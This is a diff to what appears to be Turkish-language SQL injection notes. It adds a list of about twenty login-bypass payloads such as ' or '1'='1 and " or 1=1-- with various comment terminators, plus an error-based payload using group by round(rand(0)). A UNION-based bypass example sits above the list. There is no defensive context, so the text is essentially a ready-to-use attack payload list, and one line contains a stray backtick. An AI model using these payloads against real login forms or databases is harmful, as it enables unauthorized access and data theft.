@@ -6,6 +6,32 @@ Sqli saldırılarında ilk önce veri tabanının versiyonun öğrenmek hazırla
 
 USERNAME : admin' UNION SELECT '12345' AS password#    PASSWORD : 12345
 
+admin' or '1'='1
+' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+
+or 1=1 group by round(rand(0)) having min(0);#
+
+
 
 
 
